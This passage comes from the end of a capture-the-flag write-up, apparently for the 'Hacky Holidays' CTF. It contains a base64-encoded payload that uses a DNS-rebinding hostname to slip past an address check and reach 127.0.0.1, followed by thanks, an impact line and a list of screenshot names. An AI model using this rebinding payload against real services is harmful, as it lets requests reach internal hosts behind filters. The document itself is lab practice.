eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
```

And, sent this payload for a few times and the time it was successful, it passed the check with 192.168.0.1 and pings 127.0.0.1 and the challenge is complete.
{F1133187}
{F1133188}

Thanks to Adam Langley and team for putting up such an awesome CTF. It was a great learning experience. :)

## Impact

The attacker was able to stop the DDOS Attack on Santa's Servers.

## Attachments
- HackyHolidays.png
- temp1snip.png
- tempsnip.png
- Untitled.png
- Untitled_1.png
- Untitled_2.png
- Untitled_3.png
- Untitled_4.png
- xxx.png
- secretasecretadadmin.phpmin.phpdmin.php.png
- Untitled_5.png
- Untitled_6.png
- Untitled_8.png
- Untitled_7.png
- Untitled_9.png
- tempsnip_1.png
- Untitled_10.png
- Untitled_12.png
- Untitled_11.png
- Untitled_13.png
- Untitled_14.png
- Untitled_design_(1).png
- Untitled_15.png
- Untitled_16.png
- image0.jpg
- Screenshot_2020-12-27_021108.png
- Capture.png
- Untitled_17.png
- Untitled_18.png
- Untitled_20.png
- Untitled_19.png
- Untitled_21.png
- Untitled_22.png
- Untitled_24.png
- Untitled_23.png
- Untitled_25.png
